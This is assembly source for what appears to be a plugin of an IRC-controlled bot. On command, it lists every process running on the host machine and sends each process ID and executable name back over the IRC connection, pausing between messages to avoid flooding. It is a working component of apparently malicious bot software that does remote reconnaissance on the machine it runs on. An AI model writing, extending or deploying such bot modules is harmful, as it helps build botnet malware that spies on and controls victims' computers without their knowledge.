;-----------------------------------------------------------------------
.386
.model flat, stdcall
option casemap:none

;-----------------------------------------------------------------------
include     project.inc
include     ..\..\common\misc.inc

;-----------------------------------------------------------------------
.code
;-----------------------------------------------------------------------
plist   proc    lpszline
    local   dwsocket, szmsgbuffer[1024]:byte, szreply[64]:byte, szbuffer1[64]:byte
    local   hsnap, pe:PROCESSENTRY32, szsleep[8]:byte, dwsleep
    
    mov     eax, lpbot_info
    m2m     dwsocket, (sbot_data ptr [eax]).dwsocket
    
    ; to respond to. channel or user
    invoke  get_token, addr szbuffer1, lpszline, ' ', 0, FALSE
    invoke  get_token, addr szbuffer1, addr szbuffer1, ':', 1, FALSE
    invoke  get_token, addr szbuffer1, addr szbuffer1, '!', 0, FALSE
    
    invoke  get_token, addr szreply, lpszline, ' ', 2, FALSE
    .if     byte ptr szreply != '#'
        invoke  xcopy, addr szreply, addr szbuffer1, sizeof szbuffer1
    .endif

    ; avoid flooding
    invoke  get_token, addr szsleep, lpszline, ' ', 5, FALSE
    invoke  printf, SADD("sleep interval: %s"), addr szsleep
    invoke  atodw, addr szsleep
    mov     dwsleep, eax
    .if     dwsleep > 1000*60 || dwsleep < 1500
        mov     dwsleep, 1500
    .endif

    ; showing it
    invoke  wsprintf, addr szmsgbuffer, SADD('PRIVMSG %s :%s', EOL), addr szreply, SADD("[+] Process list:")
    invoke  send, dwsocket, addr szmsgbuffer, FUNC(lstrlen, addr szmsgbuffer), 0

    invoke  CreateToolhelp32Snapshot, TH32CS_SNAPPROCESS, 0
	mov     hsnap, eax
	.if     eax

        mov     pe.dwSize, sizeof PROCESSENTRY32
        invoke  Process32First, hsnap, addr pe
        
        .while     eax
        
            invoke  wsprintf, addr szmsgbuffer, SADD('PRIVMSG %s :[%lu] %s', EOL), addr szreply, pe.th32ProcessID, addr pe.szExeFile

            invoke  send, dwsocket, addr szmsgbuffer, FUNC(lstrlen, addr szmsgbuffer), 0    
        
            invoke  Sleep, dwsleep

            invoke  Process32Next, hsnap, addr pe
        
        .endw
	
	.else

        invoke  wsprintf, addr szmsgbuffer, SADD('PRIVMSG %s :%s', EOL), addr szreply, SADD("[+] Fail to list processes:")
        invoke  send, dwsocket, addr szmsgbuffer, FUNC(lstrlen, addr szmsgbuffer), 0

	.endif


    ; ok. done.
    invoke  wsprintf, addr szmsgbuffer, SADD('PRIVMSG %s :%s', EOL), addr szreply, SADD("[-] Process list end.")   
    invoke  send, dwsocket, addr szmsgbuffer, FUNC(lstrlen, addr szmsgbuffer), 0
    
    invoke  CloseHandle, hsnap

    ret
plist   endp

;-----------------------------------------------------------------------
ibm_init    proc    lpsbot_data
    
    m2m     lpbot_info, lpsbot_data
    mov     eax, offset mdt
    
    ret
ibm_init    endp

end
;-----------------------------------------------------------------------
